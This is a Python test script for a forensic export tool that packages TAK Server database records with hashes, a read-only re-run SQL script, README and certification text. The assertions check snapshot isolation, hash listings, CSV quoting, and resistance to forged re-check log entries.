BSO = chr(92) + "o"          # a literal backslash-o, psql's output directive
zf, summary = _package(channels=CHANNELS)
names = zf.namelist()
check("queries.sql is in the package", "t-queries.sql" in names)
qs = zf.read("t-queries.sql").decode("utf-8")
check("queries.sql carries the bound window and box as literals, no %s placeholders left",
      START in qs and END in qs and str(WEST) in qs and str(NORTH) in qs and "%s" not in qs)
check("queries.sql has one output section per query file plus the shapes deletion query",
      all(f"{BSO} t-recheck-{f.replace('.csv', '')}.csv" in qs for f in exports.OPTIONAL_FILES) and
      f"{BSO} t-recheck-manifest.csv" in qs and f"{BSO} t-recheck-shapes-deletions.csv" in qs)
check("queries.sql is psql-ready: CSV output, timezone pinned, every statement terminated",
      chr(92) + "pset format csv" in qs and "SET timezone = " in qs and
      qs.count(BSO + "\n") == qs.count(BSO + " t-recheck-"))
check("queries.sql contains only SELECT statements (nothing that writes)",
      not re.search(r"^\s*(INSERT|UPDATE|DELETE|DROP|ALTER|CREATE|TRUNCATE)\b", qs, re.I | re.M))
check("queries.sql is hashed in SHA256SUMS.txt",
      "t-queries.sql" in zf.read("t-SHA256SUMS.txt").decode("utf-8"))
readme = zf.read("t-README.txt").decode("utf-8")
check("README lists queries.sql, explains where the data came from, and describes the one-line re-check",
      "t-queries.sql" in readme and "WHERE THIS DATA CAME FROM" in readme and
      "/var/lib/takextract/recheck/t/<date-time>/" in readme and "RECHECK-INFO.txt" in readme)
check("queries.sql in a channel-filtered export carries the channel filter (cot.csv and the raw rows)",
      qs.count("substring(r.groups from") >= 2 or "groups" in qs)

# ---- the package after the trim ------------------------------------------
check("cot_router-raw.csv is in the package and hashed; positions-plain.csv and the steps file are not",
      "t-cot_router-raw.csv" in names and "t-cot_router-raw.csv" in zf.read("t-SHA256SUMS.txt").decode("utf-8") and
      not any(n.endswith(("positions-plain.csv", "admin-recheck-steps.txt")) for n in names))
check("queries.sql still carries the plain query and the raw-rows query, writing beside the script",
      f"{BSO} t-recheck-positions-plain.csv" in qs and f"{BSO} t-recheck-cot_router-raw.csv" in qs and
      "ST_Y(event_pt) BETWEEN" in qs)
check("the raw statement has the server cast every column to text",
      'r."id"::text AS "id"' in qs and 'r."detail"::text AS "detail"' in qs and
      "ST_Y(r.event_pt)::text AS latitude" in qs)
check("queries.sql says which one line is expected to match, and that the others are not compared by hash",
      "ONE line is expected to match" in qs and "recheck-cot_router-raw.csv" in qs and
      "are not compared by hash" in qs and "by CONTENT" in qs and "WHAT THE RE-CHECK COMPARES" in qs and
      "/var/lib/takextract/recheck/t/" in qs and "RECHECK-INFO.txt" in qs and
      "psql -h <host> -p <port> -U <account> -d cot -f t-queries.sql" in qs and "/tmp is not a place for evidence" in qs)
check("the plain query is plain: no envelope, no channel decoding, no type exclusion",
      "ST_MakeEnvelope" not in exports.PLAIN_POSITIONS_SQL and "groups" not in exports.PLAIN_POSITIONS_SQL
      and "b-t-f" not in exports.PLAIN_POSITIONS_SQL)
check("README explains the re-check: one line from the Export page, do it at export time",
      "THE ADMINISTRATOR'S RE-CHECK" in readme and "posts\n  ONLY the list of hashes back" in readme and
      "do it at export time" in readme and "t-cot_router-raw.csv" in readme and
      "takserver-export" not in readme and "positions-plain" not in readme.split("FILES IN THIS PACKAGE")[1].split("HOW TO")[0])
# The scope of the re-check, in the package that travels with the evidence:
# which two files are compared, and both reasons the rest are not. A reader
# who only ever sees the zip has to be able to find this.
_scope = readme.split("WHAT THE RE-CHECK COMPARES")[1].split("SENTINEL VALUES")[0]
check("README states what the re-check compares: two files by hash, named, and the rest recorded",
      "WHAT THE RE-CHECK COMPARES" in readme
      and "COMPARED BY HASH" in _scope and "RECORDED, NOT COMPARED" in _scope
      and "t-queries.sql" in _scope and "t-recheck-cot_router-raw.csv" in _scope
      and "the same hash" in _scope)
check("README gives both reasons the other files are not compared by hash, and names the eight",
      "Formatting" in _scope and "psql" in _scope
      and "not limited by time at all" in _scope
      and all(f"{n}.csv" in _scope for n in
              ("missions", "mission-subs", "mission-contents", "files",
               "attachments", "video", "datafeeds", "federation"))
      and "cot.csv, shapes.csv, chat.csv, connections.csv" in _scope
      and "retention purge" in _scope)
check("the raw file is absent when cot.csv is excluded (it describes cot.csv's rows)",
      not any(n.endswith("cot_router-raw.csv") for n in _package(included=["chat.csv"])[0].namelist()))

# psql_csv: the exact rules from src/fe_utils/print.c
_bs = chr(92)
_nl = chr(10)
_out = exports.psql_csv(["a", "b"], [["x,y", 'he said "hi"'], [None, "line" + _nl + "break"], [_bs + ".", "plain"], ["", " lead"]])
_exp = ("a,b" + _nl + '"x,y","he said ""hi"""' + _nl + ',"line' + _nl + 'break"' + _nl +
        '"' + _bs + '.",plain' + _nl + ", lead" + _nl)
check("psql_csv: quotes only on separator / quote / CR / LF / backslash-dot, doubled quotes, empty NULL, LF ends",
      _out == _exp)

# ---- one snapshot, stated -------------------------------------------------
_FakeCursor.executed.clear()
zf_s, summary_s = _package()
readme_s = zf_s.read("t-README.txt").decode("utf-8")
check("the very first statement opens a REPEATABLE READ, READ ONLY transaction",
      _FakeCursor.executed[0].strip().startswith("SET TRANSACTION ISOLATION LEVEL REPEATABLE READ READ ONLY"))

# The caller has usually already run a statement on the connection (the
# audit log's timezone lookup) - psycopg2 then has a transaction open, and
# SET TRANSACTION would be rejected as not-first. begin_snapshot() must end
# that transaction first, and the connection must see it do so.
class _TxnConn(_FakeConn):
    rollbacks = 0
    in_txn = False
    def cursor(self):
        conn = self
        class _C(_FakeCursor):
            def execute(self, sql, params=None):
                if sql.strip().startswith("SET TRANSACTION") and conn.in_txn:
                    raise RuntimeError("SET TRANSACTION ISOLATION LEVEL must be called before any query")
                conn.in_txn = True
                super().execute(sql, params)
        return _C()
    def rollback(self):
        _TxnConn.rollbacks += 1
        self.in_txn = False
tc = _TxnConn()
with tc.cursor() as c:
    c.execute("SHOW timezone;")          # what the route does before build_package
zb_t, _ = exports.build_package(tc, PARAMS, "t", "tester", "TEST")
readme_t = zipfile.ZipFile(io.BytesIO(zb_t)).read("t-README.txt").decode("utf-8")
check("a transaction already open on the connection is ended before SET TRANSACTION, so the snapshot still opens",
      "DB snapshot      : 1234:1234: - every statement" in readme_t and _TxnConn.rollbacks >= 1)
qs_t = zipfile.ZipFile(io.BytesIO(zb_t)).read("t-queries.sql").decode("utf-8")
check("queries.sql runs in one REPEATABLE READ READ ONLY transaction with ON_ERROR_ROLLBACK, records its snapshot, and commits",
      "BEGIN ISOLATION LEVEL REPEATABLE READ READ ONLY;" in qs_t and "ON_ERROR_ROLLBACK on" in qs_t and
      "t-recheck-snapshot.txt" in qs_t and qs_t.rstrip().endswith("COMMIT;" + chr(10) + "-- End of re-run script."))
check("README states the snapshot id, that every statement read one instant, the account, its write privileges and the clocks",
      "DB snapshot      : 1234:1234: - every statement in this package read the database at this one instant" in readme_s and
      "DB account       : takextract_ro; write privilege on cot_router:" in readme_s and "none" in readme_s and
      "Clock difference :" in readme_s and "(database clock minus tool clock)" in readme_s)
check("cot_router-raw.csv is written unmodified: no spreadsheet guard, and the README says so",
      "UNMODIFIED" in readme_s)
check("README names the read-only account the export used, for a by-hand re-run",
      "The read-only account this export used:\n  takextract_ro." in readme_s)
check("summary carries the script text and the raw file's hash for the re-check token",
      summary_s["queries_sql"] == zf_s.read("t-queries.sql").decode("utf-8") and
      summary_s["raw_sha256"] == hashlib.sha256(zf_s.read("t-cot_router-raw.csv")).hexdigest() and
      any(l.endswith("  t-cot_router-raw.csv") and l.startswith(summary_s["raw_sha256"])
          for l in zf_s.read("t-SHA256SUMS.txt").decode("utf-8").splitlines()))
# Every file's hash leaves build_package as well as going into the zip, so
# the audit entry can record what the package held. The hash file is not in
# the list: it is the list, and nothing hashes it.
_sums = dict((l.split("  ")[1], l.split("  ")[0])
             for l in zf_s.read("t-SHA256SUMS.txt").decode("utf-8").splitlines() if l.strip())
_listed = dict(summary_s["file_hashes"])
# ---- which database this came from ---------------------------------------
# Two identifiers, because they are not equally available, and the package
# has to say which one it got - they are not worth the same.
check("the export records the cluster's own identifier when the role can read it",
      summary_s["source_identity"] == "cluster 7412345678901234567")
check("the README names it and says what it is worth, and what a difference does not mean",
      "Database identity: cluster 7412345678901234567" in readme_s
      and "fixed when it was" in readme_s
      and "not by itself a" in readme_s
      and "replica of a cluster reports" in readme_s)

_zf_ng, _sum_ng = exports.build_package(_NoGrantConn(), PARAMS, "t", "tester", "TEST")
_readme_ng = zipfile.ZipFile(io.BytesIO(_zf_ng)).read("t-README.txt").decode("utf-8") \
    if isinstance(_zf_ng, bytes) else None
check("without the grant it falls back to catalog identifiers rather than recording nothing",
      _sum_ng["source_identity"] == "catalog cot/16384/16512")
check("and the README says that is the weaker one, and why it is being used",
      "Database identity: catalog cot/16384/16512" in _readme_ng
      and "weaker fingerprint" in _readme_ng
      and "could not read the cluster" in _readme_ng
      and "by chance" in _readme_ng)
check("a refused grant does not cost the snapshot - the whole point of the SAVEPOINT",
      "DB snapshot      : 1234:1234: -" in _readme_ng)

check("summary carries every file in the package and its hash, the hash file apart",
      _listed == _sums and "t-SHA256SUMS.txt" not in _listed
      and _listed["t-queries.sql"] == hashlib.sha256(zf_s.read("t-queries.sql")).hexdigest()
      and set(_listed) | {"t-SHA256SUMS.txt"} == set(zf_s.namelist()))
# The package carries the one-page check, and no longer a blank form: the
# certification's own blanks were facts the tool already holds, and nothing
# ever read the file back.
_verify = zf_s.read("t-VERIFY.txt").decode("utf-8")
check("the package ships VERIFY.txt, hashed like everything else, and no blank certification",
      "t-VERIFY.txt" in zf_s.read("t-SHA256SUMS.txt").decode("utf-8")
      and "t-certification-template.txt" not in zf_s.namelist()
      and "certification-template" not in zf_s.read("t-SHA256SUMS.txt").decode("utf-8"))
check("VERIFY.txt gives one command for every file, and separates it from the zip's own hash",
      "sha256sum -c t-SHA256SUMS.txt" in _verify
      and "ARE THESE THE FILES THIS PACKAGE WAS BUILT WITH?" in _verify
      and "IS THIS THE PACKAGE THE TOOL RECORDED BUILDING?" in _verify
      and "it IS the list" in _verify
      and "WHAT THIS DOES NOT SHOW" in _verify)
check("VERIFY.txt counts every file in the package, itself and the hash file included",
      f"one of the {len(zf_s.namelist())} files was hashed" in _verify)
check("the README points at VERIFY.txt instead of repeating it",
      "See t-VERIFY.txt" in readme_s and "t-VERIFY.txt" in readme_s.split("FILES IN THIS PACKAGE")[1]
      and "certification-template" not in readme_s)

# The certification is still built - from Verify & Replay, with the facts that
# do not exist at export time filled in rather than left blank.
_CERT_FACTS = {"produced_by": "TAK-Extract test", "exported": "2026-09-21 16:11:35 UTC",
               "exported_by": "authenticated: admin", "requested_for": "Det. Example",
               "source": "the TAK Server PostgreSQL database"}
cert_blank = exports.build_certification("t", _CERT_FACTS, [("t-cot.csv", "11" * 32)])
check("certification without the later facts: blanks for the zip, and says no re-check is recorded",
      "SHA-256 of the zip : ____" in cert_blank
      and "No re-check is recorded for this package" in cert_blank
      and "Nothing here is legal advice" in cert_blank
      and """taken from TAK-Extract's audit log""" in cert_blank)
cert_full = exports.build_certification(
    "t", _CERT_FACTS, [("t-cot.csv", "11" * 32)], package_sha256="ab" * 32,
    recheck={"ts_local": "2026-09-21 16:13:24 UTC", "actor": "authenticated: admin",
             "detail": ("re-check at takserver:/var/lib/takextract/recheck/t/x; "
                        "hash file t-recheck-SHA256SUMS.txt sha256 " + "ee" * 32 + "; "
                        "archive t-recheck.tgz sha256 " + "dd" * 32 + "; "
                        "SQL query script match: yes; raw table rows match: yes")})
check("certification with them: zip hash, re-check hashes, where the files are, both verdicts",
      "ab" * 32 in cert_full and "ee" * 32 in cert_full and "dd" * 32 in cert_full
      and "takserver:/var/lib/takextract/recheck/t/x" in cert_full
      and "2026-09-21 16:13:24 UTC" in cert_full
      and cert_full.count(": yes") == 2
      and "____" not in cert_full.split("5. DECLARATION")[0])
check("a certification for an export with no recorded file list says so",
      "predates the recording of per-file hashes" in
      exports.build_certification("t", _CERT_FACTS, [], package_sha256="ab" * 32))
# A re-check detail whose FIRST clause carries text shaped like the named
# hashes. One like this can no longer be posted, but a log already holding
# one cannot be corrected - so the reader has to require a clause boundary
# on its own account, or the certification prints the poster's values and
# never shows the ones the route recorded.
_forged = ("re-check at tak01:/evidence/case42 hash file x sha256 " + "11" * 32 +
           " archive y sha256 " + "22" * 32 + "; "
           "2 file(s) hashed on the server; "
           "hash file t-recheck-SHA256SUMS.txt sha256 " + "ee" * 32 + "; "
           "archive t-recheck.tgz sha256 " + "dd" * 32 + "; "
           "SQL query script match: yes; raw table rows match: yes")
_sec = exports._certification_recheck("t", {"ts_local": "t", "actor": "a", "detail": _forged})
check("the certification reads a named hash only as its own clause, never from inside another",
      ("ee" * 32) in _sec and ("dd" * 32) in _sec
      and ("11" * 32) not in _sec and ("22" * 32) not in _sec)

check("the certification calls the re-check corroboration, not a requirement",
      "over and above the standard" in cert_full
      and "not deficient" in cert_full
      and "recorded, not compared" in cert_full)

# A channel-narrowed package must not silently re-run unfiltered: the
# statements rendered are the ones executed.
zf_all, _ = _package()
qs_all = zf_all.read("t-queries.sql").decode("utf-8")
check("queries.sql differs between a filtered and an unfiltered export", qs != qs_all)

print()
if failures:
    print(f"{len(failures)} FAILURE(S):")
    for f in failures:
        print(f"  - {f}")
    sys.exit(1)
print("ALL EXPORT TESTS PASSED")
